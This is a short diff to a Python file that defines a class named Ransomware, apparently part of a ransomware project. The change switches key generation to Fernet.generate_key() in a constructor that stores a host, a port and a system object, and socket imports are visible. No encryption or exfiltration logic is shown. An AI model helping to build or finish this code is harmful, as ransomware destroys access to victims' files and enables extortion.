@@ -1,12 +1,12 @@
 from time import sleep
 from modules.system import System
-from modules.crypto import generate_key, Fernet, Encrypt
+from modules.crypto import Fernet, Encrypt
 from socket import socket, AF_INET, SOCK_STREAM
 
 class Ransomware:
 
     def __init__(self, host: str, port: int) -> None:
-        self.key = generate_key()
+        self.key = Fernet.generate_key()
         self.host = host
         self.port = port
         self.system: System = System()
